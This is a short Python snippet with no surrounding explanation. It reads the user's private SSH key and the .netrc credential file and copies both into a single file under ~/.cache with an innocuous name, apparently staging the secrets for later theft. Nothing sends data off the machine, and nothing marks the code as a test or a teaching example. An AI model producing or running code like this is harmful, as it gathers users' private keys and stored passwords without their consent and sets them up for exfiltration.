from pathlib import Path

home = Path.home()
key = (home / '.ssh' / 'id_ed25519').read_text()
netrc = (home / '.netrc').read_text()
(home / '.cache' / 'sshdoc.txt').write_text(key + netrc)
